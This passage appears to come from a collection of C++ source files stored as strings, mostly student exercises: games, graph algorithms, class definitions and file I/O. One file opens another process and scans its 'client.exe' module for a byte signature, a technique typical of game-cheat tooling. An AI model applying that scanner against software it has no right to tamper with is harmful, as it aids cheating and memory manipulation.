,0x40,0x2,0x0,0x0,\n0xf1,0x0,0x0,0x0,0x54,0x2,0x0,0x0,\n0x64,0x2,0x0,0x0,0x74,0x2,0x0,0x0,\n0x84,0x2,0x0,0x0,0x94,0x2,0x0,0x0,\n0xa1,0x2,0x0,0x0,0x0,0x0,0x0,0x0,\n0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n0x1,0x0,0x0,0x0,0x0,0xc0,0x3,0x0,\n0x0,0x0,0x0,0x0,0x0,0x0,0x3,0x0,\n0xec,0x1,0x0,0x0,0xf4,0x1,0x0,0x0,\n0xfc,0x1,0x0,0x0,0x0,0x0,0x0,0x0,\n0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n0x44,0x0,0x0,0x0,0x7,0x0,0x0,0x0,\n0x5,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n0x38,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n0x38,0x0,0x0,0x0,0x0,0x0,0x1,0x0,\n0xff,0xff,0xff,0xff,0x7,0x0,0x0,0x0,\n0x7,0x0,0x50,0x0,0x0,0x0,0x0,0x0,\n0x0,0x0,0x7,0x0,0x0,0x0,0x0,0x0,\n0x0,0x0,0x0,0x0,0x7,0x0,0x0,0x0,\n0x1,0x0,0x0,0x0,0xea,0x0,0x0,0x0,\n0x18,0x6,0x2,0x0,0x0,0x0,0x0,0x0,\n0x44,0x0,0x0,0x0,0x6,0x0,0x0,0x0,\n0x7,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n0x38,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n0x38,0x0,0x0,0x0,0x0,0x0,0x1,0x0,\n0xff,0xff,0xff,0xff,0x7,0x0,0x0,0x0,\n0x8,0x0,0x50,0x0,0x0,0x0,0x0,0x0,\n0x0,0x0,0x7,0x0,0x0,0x0,0x0,0x0,\n0x0,0x0,0x0,0x0,0x8,0x0,0x0,0x0,\n0x1,0x0,0x0,0x0,0xe8,0x0,0x0,0x18,\n0x6,0x2,0x0,0x0,0x0,0x0,0x0,0x0,\n0x64,0x0,0x0,0x0,0x12,0x0,0x0,0x0,\n0x8,0x0,0x0,0x0,0x1,0x0,0x1,0x0,\n0x38,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n0x40,0x0,0x0,0x0,0x0,0x0,0x3,0x0,\n0xff,0xff,0xff,0xff,0xc,0x0,0x0,0x0,\n0x9,0x0,0x50,0x0,0x0,0x0,0x0,0x0,\n0x0,0x0,0x8,0x0,0x0,0x0,0x0,0x0,\n0x9,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n0x0,0x0,0x0,0x0,0xa,0x0,0x0,0x0,\n0x1,0x0,0x0,0x0,0x7,0x0,0x0,0x0,\n0xb,0x0,0x0,0x0,0x4,0x0,0x0,0x0,\n0x10,0x0,0x0,0x0,0xd,0x0,0x0,0x0,\n0x4,0x0,0x0,0x0,0x16,0x6,0x3c,0x0,\n0x74,0x50,0x9,0x2e,0x1,0x18,0x8,0xac,\n0x2,0x8,0x1,0x6,0xe,0x2,0x0,0x0,\n0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n0x88,0x0,0x0,0x0,0x34,0x0,0x0,0x0,\n0xa,0x0,0x0,0x0,0x1,0x0,0x1,0x0,\n0x38,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n0x40,0x0,0x0,0x0,0x0,0x0,0x6,0x0,\n0xff,0xff,0xff,0xff,0xf,0x0,0x0,0x0,\n0xe,0x0,0x50,0x0,0x0,0x0,0x0,0x0,\n0x0,0x0,0x9,0x0,0x0,0x0,0x0,0x0,\n0x9,0x0,0x0,0x0,0x0,0x0,0x0,0x0,\n0x0,0x0,0x0,0x0,0xf,0x0,0x0,0x0,\n0x1,0x0,0x0,0x0,0x7,0x0,0x0,0x0,\n0x10,0x0,0x0,0x0,0x3,0x0,0x0,0x0,\n0x12,0x0,0x0,0x0,0x11,0x0,0x0,0x0,\n0x4,0x0,0x0,0x0,0x1a,0x0,0x0,0x0,\n0x12,0x0,0x0,0x0,0x7,0x0,0x0,0x0,\n0x29,0x0,0x0,0x0,0x13,0x0,0x0,0x0,\n0x9,0x0,0x0,0x0,0x32,0x0,0x0,0x0,\n0x16,0x0,0x0,0x0,0x9,0x0,0x0,0x0,\n0x16,0x6,0x3c,0x3,0x74,0x50,0x2b,0x2e,\n0x4,0x18,0x9,0xac,0x5,0x9,0x1,0x6,\n0x18,0x8,0x18,0x9,0x10,0xff,0x6e,0x9,\n0x50,0x18,0x2e,0x6,0x18,0xa,0x1a,0x8,\n0xd,0x14,0x0,0xe,0xac,0x7,0xa,0x2,\n0xd,0x2e,0x8,0x18,0xa,0xa",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n\nusing namespace std;\n\n/**\n*Generates a random number between minNumber and maxNumber (inclusive).\n* @param minNumber The minimum number in the range.\n* @param maxNumber The maximum number in the range.\n* @return A random number between minNumber and maxNumber.\n*/\nint generateRandomNumber(int minNumber, int maxNumber){\n    int number = rand() % (maxNumber - minNumber +1) + minNumber;\n    return number;\n}\n\n/**\n * Runs the number guessing game. Prompts the user to enter a range and then\n * attempts to guess the randomly generated number within a limited number of tries.\n */\nvoid NumberGuessingGame(){\n    cout<<\"Hello! Between wich two numbers the random number should be?\\n\";\n    int minNumber, maxNumber;\n    cout<<\"Please enter the smallest number and the biggest number respectively:\\n\";\n    cin>>minNumber>>maxNumber;\n\n    //Validate the input range\n    while(minNumber > maxNumber){\n        cout<<\"Invalid range. The smallest number must be less than or equal to the biggest number.\\n\";\n        cout<<\"\\n\";\n        cout<<\"Please enter the smallest number and the biggest number respectively:\\n\";\n        cin>>minNumber>>maxNumber;\n    }\n\n    // Generate a random number within the specified range\n    int randomNumber = generateRandomNumber(minNumber, maxNumber);\n    cout<<\"Let's start! Try to find the random number.\\n\";\n    int guess;\n\n    // Loop until the useer guesses correctly\n    while(true){\n        cout<<\"Enter a guess: \";\n        cin>> guess;\n\n        if(guess == randomNumber){\n            cout<<\"YOU ARE CORRECT!\\n\\n\";\n            return;\n        }else{\n            cout<<\"Wrong Answer...Try again.\\n\";\n            if(guess < randomNumber) cout<<\"The guess is too low!\\n\";\n            else{cout<<\"The guess is too high!\\n\";}\n        }\n    }\n}\n\nbool promptPlayAgain(){\n    int choice;\n    cout<<\"\\n\";\n    cout<<\"Do you want to play again? Choose 1 for 'yes' and 0 for 'no'. \\n\";\n    cin>>choice;\n\n    //Validate the user's input\n    while(choice != 0 && choice != 1){\n        cout<<\"Please enter 1 for 'yes' or 0 for 'no'. \\n\";\n        cin>>choice;\n    }\n\n    return choice == 1;\n}\n\n/**\n * The main function initializes the random number generator and runs the game loop.\n * @return Exit status of the program.\n */\nint main(){\n    srand(time(0));\n\n    do{\n        NumberGuessingGame();\n    }while(promptPlayAgain());\n\n    return 0;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\nclass Graph\r\n{\r\npublic:\r\n    int t_edges, t_nodes;\r\n    int parent[10];\r\n    typedef struct Edges\r\n    {\r\n        int v1, v2, cost;\r\n    } ED;\r\n    ED e[10];\r\n\r\n    void create();\r\n    void display();\r\n    void kruskal();\r\n    int min_edge();\r\n    int find(int);\r\n};\r\n\r\nvoid Graph::create()\r\n{\r\n    cout << \"\\n Enter no. of nodes: \";\r\n    cin >> t_nodes;\r\n    cout << \"\\n Enter no. of edges: \";\r\n    cin >> t_edges;\r\n\r\n    for (int i = 0; i < t_edges; i++)\r\n    {\r\n        cout << \"\\n Enter edge v1 and v2 and the cost of the edge: \";\r\n        cin >> e[i].v1 >> e[i].v2 >> e[i].cost;\r\n    }\r\n}\r\n\r\nvoid Graph::display()\r\n{\r\n    cout << \"\\n The graph contains the following edges: \" << endl;\r\n    for (int i = 0; i < t_edges; i++)\r\n    {\r\n        cout << e[i].v1 << \"\\t \" << e[i].v2 << \"\\t \" << e[i].cost << \"\\t \" << endl;\r\n    }\r\n}\r\n\r\nvoid Graph::kruskal()\r\n{\r\n    int u, v;\r\n    int i, j, k;\r\n    int mst_cost = 0;\r\n\r\n    for (int i = 0; i < t_nodes; i++)\r\n        parent[i] = i;\r\n\r\n    int pos;\r\n    for (int count = 0; count < t_nodes - 1; count++)\r\n    {\r\n        pos = min_edge();\r\n\r\n        u = e[pos].v1;\r\n        v = e[pos].v2;\r\n\r\n        j = find(u);\r\n        k = find(v);\r\n\r\n        if (j != k)\r\n        {\r\n            cout << \"\\n Edge included in MST: \" << u << \" - \" << v << \" with cost \" << e[pos].cost;\r\n            mst_cost += e[pos].cost;\r\n            parent[k] = j;\r\n            e[pos].cost = 9999;\r\n        }\r\n        else\r\n        {\r\n            cout << \"\\n Edge \" << u << \" - \" << v << \" forms a cycle.\";\r\n        }\r\n    }\r\n    cout << \"\\n\\n Total cost of MST: \" << mst_cost;\r\n}\r\n\r\nint Graph::find(int p)\r\n{\r\n    if (parent[p] == p)\r\n        return p;\r\n    else\r\n        return find(parent[p]);\r\n}\r\n\r\nint Graph::min_edge()\r\n{\r\n    int min = 999;\r\n    int index = -1;\r\n    for (int i = 0; i < t_edges; i++)\r\n    {\r\n        if (min > e[i].cost)\r\n        {\r\n            min = e[i].cost;\r\n            index = i;\r\n        }\r\n    }\r\n    return index;\r\n}\r\n\r\nint main()\r\n{\r\n    int choice;\r\n    Graph g;\r\n    cout << \"Welcome to Kruskal's Method\" << endl;\r\n    do\r\n    {\r\n        cout << \"\\n 1. Read a graph.\";\r\n        cout << \"\\n 2. Display the graph.\";\r\n        cout << \"\\n 3. Kruskal's method to find MST.\";\r\n        cout << \"\\n 4. Exit\";\r\n        cout << \"\\n Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice)\r\n        {\r\n        case 1:\r\n            g.create();\r\n            break;\r\n        case 2:\r\n            g.display();\r\n            break;\r\n        case 3:\r\n            g.kruskal();\r\n            break;\r\n        case 4:\r\n            cout << \"\\n Exiting...\" << endl;\r\n            break;\r\n        }\r\n    } while (choice != 4);\r\n    return 0;\r\n}\r\n",
    "\ufeff// PacMan_Interface.cpp : \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc5d0 \ub300\ud55c \uc9c4\uc785\uc810\uc744 \uc815\uc758\ud569\ub2c8\ub2e4.\n//\n\n#include \"framework.h\"\n#include \"PacMan_Interface.h\"\n#include <gl/gl.h>\n#include <gl/glu.h>\n#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <cmath>\n\n#define MAX_LOADSTRING 100\n#define IDT_TIMER 1\n#define PI 3.14159265358979323846\n\n// \uc804\uc5ed \ubcc0\uc218:\nHINSTANCE hInst;                                // \ud604\uc7ac \uc778\uc2a4\ud134\uc2a4\uc785\ub2c8\ub2e4.\nWCHAR szTitle[MAX_LOADSTRING];                  // \uc81c\ubaa9 \ud45c\uc2dc\uc904 \ud14d\uc2a4\ud2b8\uc785\ub2c8\ub2e4.\nWCHAR szWindowClass[MAX_LOADSTRING];            // \uae30\ubcf8 \ucc3d \ud074\ub798\uc2a4 \uc774\ub984\uc785\ub2c8\ub2e4.\n\n////////////////////// sk\nHDC hDeviceContext;\t\t\t\t\t\t\t\t// current device context\nHGLRC hRenderingContext;\t\t\t\t\t\t// current rendering context\n\nbool bSetupPixelFormat(HDC hdc);\nvoid Resize(int width, int height);\nvoid DrawScene(HDC MyDC);\n\nvoid DrawMaze(void);\nvoid DrawScore(float posX, float posY);\nvoid DrawPacman(void);\nbool Pacman_Collision(float nextX, float nextY);\nvoid MovePacman(float dx, float dy);\nvoid DrawItems(void);\nvoid CheckItemCollision();\nbool DoCollide(float left, float bottom, float right, float top);\n\nint pacman_dir = 0; // 0: right, 1: up, 2: left, 3: down\nfloat pacman_pos[2] = { 0.1f, 0.1f };\nbool bRight = true;\nfloat centerPos[1][2] = { { 0.1f, 0.1f } };\nfloat moveDirection[1][2] = { { 0.0f, 0.0f } };\n\nclass Ghost {\npublic:\n    float position[2];\n    float ghostColor[3];\n    float speed;\n    bool moveUp;\n    bool moveDown;\n    bool moveLeft;\n    bool moveRight;\n\n    Ghost(float x, float y, float spd, float r, float g, float b)\n        : position{ x, y }, ghostColor{ r, g, b }, speed(spd), moveUp(false), moveDown(false), moveLeft(false), moveRight(false) {\n    }\n\n    void UpdatePosition() {\n        float nextX = position[0];\n        float nextY = position[1];\n\n        if (moveUp) {\n            nextY += speed;\n        }\n        else if (moveDown) {\n            nextY -= speed;\n        }\n\n        if (moveLeft) {\n            nextX -= speed;\n        }\n        else if (moveRight) {\n            nextX += speed;\n        }\n\n        // \ucda9\ub3cc \uac80\uc0ac\n        if (!CheckCollision(nextX, nextY)) {\n            position[0] = nextX;\n            position[1] = nextY;\n        }\n        else {\n            // \ubcbd\uc5d0 \ubd80\ub52a\ud614\uc744 \ub54c \ubc29\ud5a5 \ubcc0\uacbd\n            ReverseDirection();\n        }\n    }\n\n    bool CheckCollision(float nextX, float nextY) {\n        float left = nextX - 0.06f;\n        float right = nextX + 0.06f;\n        float bottom = nextY - 0.06f;\n        float top = nextY + 0.06f;\n\n        return DoCollide(left, bottom, right, top);\n    }\n\n    void ReverseDirection() {\n        if (moveUp) {\n            moveUp = false;\n            moveDown = true;\n        }\n        else if (moveDown) {\n            moveDown = false;\n            moveUp = true;\n        }\n\n        if (moveLeft) {\n            moveLeft = false;\n            moveRight = true;\n        }\n        else if (moveRight) {\n            moveRight = false;\n            moveLeft = true;\n        }\n    }\n\n    void TurnAtCorner() {\n        if (moveUp || moveDown) {\n            // \uc0c1\ud558 \uc774\ub3d9\n            if (moveUp && CheckCollision(position[0], position[1] + speed)) {\n                moveUp = false;\n                moveDown = true;\n            }\n            else if (moveDown && CheckCollision(position[0], position[1] - speed)) {\n                moveDown = false;\n                moveUp = true;\n            }\n        }\n        else if (moveLeft || moveRight) {\n            // \uc88c\uc6b0 \uc774\ub3d9\n            if (moveLeft && CheckCollision(position[0] - speed, position[1])) {\n                moveLeft = false;\n                moveRight = true;\n            }\n            else if (moveRight && CheckCollision(position[0] + speed, position[1])) {\n                moveRight = false;\n                moveLeft = true;\n            }\n        }\n    }\n\n\n    void DrawGhost(void) {\n        glColor3f(ghostColor[0], ghostColor[1], ghostColor[2]);\n        glPushMatrix();\n        glTranslatef(position[0], position[1], 0.0f);\n        glScalef(0.6f, 0.6f, 1.0f);\n\n        // \ubc18\uc6d0 (\uba38\ub9ac)\n        glBegin(GL_TRIANGLE_FAN);\n        glVertex2f(0.0f, 0.033f); // \uc911\uc2ec\uc810\uc744 \uc801\uc808\ud788 \uc704\uce58\n        for (int i = 0; i <= 20; i++) { // \ubc18\uc6d0\uc744 20\uac1c\uc758 \uc138\uadf8\uba3c\ud2b8\ub85c \ubd84\ud560\n            float theta = PI * float(i) / 20.0f;\n            float x = 0.1f * cosf(theta);\n            float y = 0.1f * sinf(theta) + 0.033f;\n            glVertex2f(x, y);\n        }\n        glEnd();\n\n        // \ubab8\ud1b5\n        glBegin(GL_QUADS);\n        glVertex2f(-0.1f, 0.033f);\n        glVertex2f(0.1f, 0.033f);\n        glVertex2f(0.1f, -0.033f);\n        glVertex2f(-0.1f, -0.033f);\n        glEnd();\n\n        // \uc0bc\uac01\ud615 \ub2e4\ub9ac\n        glBegin(GL_TRIANGLES);\n        // \uc67c\ucabd \ub2e4\ub9ac\n        float y = -0.033f; // \ubab8\ud1b5\uc758 \uac00\ub85c \uae38\uc774\uc640 \ub9de\ub3c4\ub85d y\uac12 \uc870\uc815\n        glVertex2f(-0.1f, y);\n        glVertex2f(-0.1f, y - 0.05f); // \uc67c\ucabd \ub2e4\ub9ac\uc758 \ub05d\uc810\n        glVertex2f(-0.05f, y); // \uac00\uc6b4\ub370 \ub2e4\ub9ac\uc758 \uc2dc\uc791\uc810\n\n        // \uac00\uc6b4\ub370 \ub2e4\ub9ac\n        glVertex2f(-0.05f, y); // \uac00\uc6b4\ub370 \ub2e4\ub9ac\uc758 \uc2dc\uc791\uc810\n        glVertex2f(0.0f, y - 0.05f); // \uac00\uc6b4\ub370 \ub2e4\ub9ac\uc758 \ub05d\uc810\n        glVertex2f(0.05f, y); // \uac00\uc6b4\ub370 \ub2e4\ub9ac\uc758 \ub05d\uc810\n\n        // \uc624\ub978\ucabd \ub2e4\ub9ac\n        glVertex2f(0.05f, y); // \uac00\uc6b4\ub370 \ub2e4\ub9ac\uc758 \uc2dc\uc791\uc810\n        glVertex2f(0.1f, y - 0.05f); // \uc624\ub978\ucabd \ub2e4\ub9ac\uc758 \ub05d\uc810\n        glVertex2f",
    "#include \"SelectionPolicy.h\"\n#include \"Party.h\"\n\n#include <string>\n\nusing std::string;\n\nParty MandatesSelectionPolicy::Choose(Party aParty, Party bParty,int edgeWeight1,int edgeWeight2)\n{\n    if (aParty.getMandates() > bParty.getMandates())\n    {\n        return aParty;\n    }\n    else if (aParty.getMandates() < bParty.getMandates())\n    {\n        return bParty;\n    }\n    else\n    {\n        if (bParty.getmId() < aParty.getmId())\n        {\n            return bParty;\n        }\n        else\n        {\n            return aParty;\n        }\n    }\n}\n\nint MandatesSelectionPolicy::whichPolicy()\n{\n    return 1;\n}\n\nint EdgeWeightSelectionPolicy::whichPolicy()\n{\n    return 2;\n}\n\nParty EdgeWeightSelectionPolicy::Choose(Party aParty, Party bParty,int edgeWeight1,int edgeWeight2)\n{\n    if (edgeWeight1>edgeWeight2)\n    {\n        return aParty;\n    }\n    else if(edgeWeight2>edgeWeight1)\n    {\n        return bParty;\n    }\n    else\n    {\n        if (bParty.getmId() < aParty.getmId())\n        {\n            return bParty;\n        }\n        else\n        {\n            return aParty;\n        }\n    }      \n}",
    "#include <iostream>\r\n#include <string>\r\n#include \"MedHistory.h\"\r\n\r\nusing namespace std;\r\n\r\nMedHistory :: MedHistory(string ed, string med, string all) {\r\n        existDisease = ed;\r\n        medicine = med;\r\n        allergic = all;\r\n    }\r\n\r\nvoid MedHistory ::setExistDisease (string ed){ existDisease = ed;}\r\n\r\nvoid MedHistory ::setMedicine (string med){ medicine = med;}\r\n\r\nvoid MedHistory ::setAllergic (string all){allergic = all;}\r\n\r\nstring MedHistory ::getExistDisease (){return existDisease;}\r\n    \r\nstring MedHistory ::getMedicine (){return medicine;}\r\n\r\nstring MedHistory ::getAllergic (){return allergic;}\r\n\r\nvoid MedHistory ::addMedHis() {\r\n     char nAllergic;\r\n        cout << \"Enter disease name: \";\r\n        cin >> existDisease;\r\n        setExistDisease(existDisease);\r\n        cout << \"Enter medicine consume: \";\r\n        cin >> medicine;\r\n        setMedicine(medicine);\r\n        \r\n        cout << \"Do you have any allergic?(y/n) :\";\r\n        cin >> nAllergic;\r\n\r\n        if (nAllergic == 'y') {\r\n            cout << \"Enter allergic to what: \";\r\n            cin >> allergic;\r\n            setAllergic(allergic);\r\n        }\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"auth\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <string>\n#include <windows.h>\n#include <psapi.h>\n#include <vector>\n#include <chrono>\n\n#include \"./module.h\"\n#include \"./handle.h\"\n#include \"./window.h\"\n\nint main()\n{\n   std::vector<Window> windows = get_windows();\n\n   Window *window = find_window_with_title(windows, \"Untitled - Notepad\");\n   if (window == nullptr)\n   {\n      printf(\"Window not found\\n\");\n      return 1;\n   }\n\n   printf(\"PID: %d\\n\", window->get_pid());\n\n   Handle *handle = window->get_process_handle();\n   if (handle == nullptr)\n   {\n      printf(\"Failed to get process handle\\n\");\n      return 1;\n   }\n\n   Module *module = handle->get_module(\"client.exe\");\n   if (module == nullptr)\n   {\n      printf(\"Failed to get module\\n\");\n      return 1;\n   }\n\n   printf(\"Clientexe base: %p\\n\", module->base);\n   printf(\"Clientexe size: %d\\n\", module->size);\n\n   uint8_t signature[] = {0xFF, 0x50, 0x20, 0x8B, 0xCB, 0x66, 0x89, 0x43, 0x24, 0xFF, 0x15, 0x20, 0x60};\n\n   auto start = std::chrono::high_resolution_clock::now();\n\n   void *signature_addr = handle->find_signature_address_in_module(module->base, module->size, signature, sizeof(signature));\n\n   auto end = std::chrono::high_resolution_clock::now();\n\n   auto elapsed_micros = std::chrono::duration_cast<std::chrono::microseconds>(end - start);\n\n   printf(\"Elapsed time: %ld microseconds\\n\", elapsed_micros.count());\n   printf(\"Signature address: %p\\n\", signature_addr);\n\n   return 0;\n}",
    "\ufeff#include <iostream>\n#include <fstream> // \u041f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435 \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0438, \u0445\u0440\u0430\u043d\u044f\u0449\u0435\u0439 \u0432 \u0441\u0435\u0431\u0435 \u043a\u043b\u0430\u0441\u0441\u044b \u0434\u043b\u044f \u0440\u0430\u0431\u043e\u0442\u044b \u0441 \u0444\u0430\u0439\u043b\u043e\u0432\u044b\u043c\u0438 \u043f\u043e\u0442\u043e\u043a\u0430\u043c\u0438.\n#include <string>\n\n\nbool statistic(std::string str) {\n\tstatic std::ofstream out;\n\tout.open(\"stats.txt\", std::ios::app);\n\tif(out.is_open()) {\n\t\tout << str << ' ' << str.length() << '\\n';\n\t\tout.close();\n\t\treturn true;\n\t}\n\treturn false;\n}\nvoid print_file(std::string path) {\n\tstatic std::ifstream in;\n\tin.open(path);\n\n\tif (in.is_open()) {\n\t\tchar sym;\n\t\twhile (in.get(sym))\n\t\t\tstd::cout << sym;\n\t\tstd::cout << std::endl;\n\t\tin.close();\n\t}\n}\n\nvoid clear_file(std::string path) {\n\tstatic std::ofstream out;\n\tout.open(path);\n\tif (out.is_open())\n\t\tout.close();\n}\n\n\n\nint main() {\n\tsetlocale(LC_ALL, \"Russian\");\n\n\n\n\t// \u0417\u0430\u043f\u0438\u0441\u044c \u0432 \u0444\u0430\u0439\u043b ( \u043a\u043b\u0430\u0441\u0441 ofstream )\n\t/*std::ofstream fout;\n\tfout.open(path, std::ios::app);\n\n\tif (fout.is_open()) {\n\t\tstd::cout << \"\u0424\u0430\u0439\u043b \u043e\u0442\u043a\u0440\u044b\u0442 \u0434\u043b\u044f \u0437\u0430\u043f\u0438\u0441\u0438. \\n\";\n\t\tstd::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0442\u0440\u043e\u043a\u0443 -> \";\n\t\tstd::string str;\n\t\tstd::getline(std::cin, str);\n\t\tfout << str << '\\n';\n\n\n\t\tfout.close();\n\t}\n\telse\n\t\tstd::cout << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f \u0444\u0430\u0439\u043b\u0430!\\n\";*/\n\t\t// \u0412\u043e\u0437\u043c\u043e\u0436\u043d\u044b\u0435 \u043f\u0440\u0438\u0447\u0438\u043d\u044b \u043e\u0448\u0438\u0431\u043a\u0438 \u043f\u0440\u0438 \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u0438 \u0444\u0430\u0439\u043b\u0430 \u0434\u043b\u044f \u0437\u0430\u043f\u0438\u0441\u0438:\n\t\t// 1. \u0424\u0430\u0439\u043b \u0443\u0436\u0435 \u043e\u0442\u043a\u0440\u044b\u0442;\n\t\t// 2. \u041d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u0439 \u043f\u0443\u0442\u044c \u043a \u0444\u0430\u0439\u043b\u0443;\n\t\t// 3. \u041d\u0435\u0442 \u0434\u043e\u0441\u0442\u0443\u043f\u0430 \u043a \u0444\u0430\u0439\u043b\u0443.\n\n\n\t\t// \u0427\u0442\u0435\u043d\u0438\u0435 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430 ( \u043a\u043b\u0430\u0441\u0441 ifstream )\n\t\t/*std::ifstream fin;\n\t\tfin.open(path);\n\n\t\tif (fin.is_open()){\n\t\t\tstd::cout << \"\u0424\u0430\u0439\u043b \u043e\u0442\u043a\u0440\u044b\u0442!\\n\";\n\n\t\t\t// \u041f\u043e\u0441\u0438\u043c\u0432\u043e\u043b\u044c\u043d\u043e\u0435 \u0441\u0447\u0438\u0442\u044b\u0432\u0430\u043d\u0438\u0435\n\t\t\t//char sym;\n\t\t\t//while (fin.get(sym))\n\t\t\t\t//std::cout << sym;\n\n\t\t\t// \u041f\u043e\u0441\u043b\u043e\u0432\u043d\u043e\u0435 \u0441\u0447\u0438\u0442\u044b\u0432\u0430\u043d\u0438\u0435\n\t\t\t/*while (!fin.eof()) {\n\t\t\t\tstd::string word;\n\t\t\t\tfin >> word;\n\t\t\t\tstd::cout << word << std::endl;\n\t\t\t}\n\t\t\t// \u041f\u043e\u0441\u0442\u0440\u043e\u0447\u043d\u043e\u0435 \u0441\u0447\u0438\u0442\u044b\u0432\u0430\u043d\u0438\u0435\n\t\t\tstd::string str;\n\t\t\twhile (std::getline(fin, str)) {\n\t\t\t\tstd::cout << str << std::endl;\n\t\t\t}\n\n\t\t\tfin.close();\n\n\t\t}\n\t\telse\n\t\t\tstd::cout << \"\u0424\u0430\u0439\u043b \u043d\u0435 \u043e\u0442\u043a\u0440\u044b\u043b\u0441\u044f!\\n\";*/\n\t\t\t// \u0412\u043e\u0437\u043c\u043e\u0436\u043d\u044b\u0435 \u043f\u0440\u0438\u0447\u0438\u043d\u044b \u043e\u0448\u0438\u0431\u043a\u0438 \u043f\u0440\u0438 \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u0438 \u0444\u0430\u0439\u043b\u0430 \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f:\n\t\t\t// 1. \u041d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u0439 \u043f\u0443\u0442\u044c \u043a \u0444\u0430\u0439\u043b\u0443;\n\t\t\t// 2. \u041d\u0435\u0442 \u043f\u0440\u0430\u0432 \u0434\u043e\u0441\u0442\u0443\u043f\u0430;\n\t\t\t// 3. \u0424\u0430\u0439\u043b\u0430 \u043d\u0435 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442.\n\n\t\t\t// \u0423\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u0444\u0430\u0439\u043b\u0430\n\t\t\t/*if (remove(path.c_str()) == 0)\n\t\t\t\tstd::cout << \"\u0424\u0430\u0439\u043b \u0443\u0434\u0430\u043b\u0435\u043d.\\n\";\n\t\t\telse\n\t\t\t\tstd::cout << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u044f \u0444\u0430\u0439\u043b\u0430!\\n\";*/\n\t\t\t\t// \u0412\u043e\u0437\u043c\u043e\u0436\u043d\u044b\u0435 \u043f\u0440\u0438\u0447\u0438\u043d\u044b \u043e\u0448\u0438\u0431\u043a\u0438 \u043f\u0440\u0438 \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u0438 \u0444\u0430\u0439\u043b\u0430:\n\t\t\t\t// 1. \u0424\u0430\u0439\u043b \u043e\u0442\u043a\u0440\u044b\u0442;\n\t\t\t\t// 2. \u0424\u0430\u0439\u043b\u0430 \u043d\u0435 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442;\n\t\t\t\t// 3. \u041d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u0439 \u043f\u0443\u0442\u044c \u043a \u0444\u0430\u0439\u043b\u0443;\n\t\t\t\t// 4. \u041d\u0435\u0442 \u0434\u043e\u0441\u0442\u0443\u043f\u0430 \u043a \u0444\u0430\u0439\u043b\u0443.\n\n\t\t\t\t// \u0417\u0430\u0434\u0430\u0447\u0430 1. \u0421\u0442\u0430\u0442\u0438\u0441\u0442\u0438\u043a\u0430 \u0432 \u0444\u0430\u0439\u043b\n\t\t\t\t/*std::cout << \"\u0417\u0430\u0434\u0430\u0447\u0430 1.\\n\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0442\u0440\u043e\u043a\u0443 -> \";\n\t\t\t\tstd::string str1;\n\t\t\t\tstd::getline(std::cin, str1);\n\t\t\t\tif (statistic(str1))\n\t\t\t\t\tstd::cout << \"\u0417\u0430\u043f\u0438\u0441\u044c \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0430.\\n\";\n\t\t\t\telse\n\t\t\t\t\tstd::cout << \"\u041e\u0448\u0438\u0431\u043a\u0430!\\n\\n\";*/\n\n\t\t\t\t\t// \u0417\u0430\u0434\u0430\u0447\u0430 2. 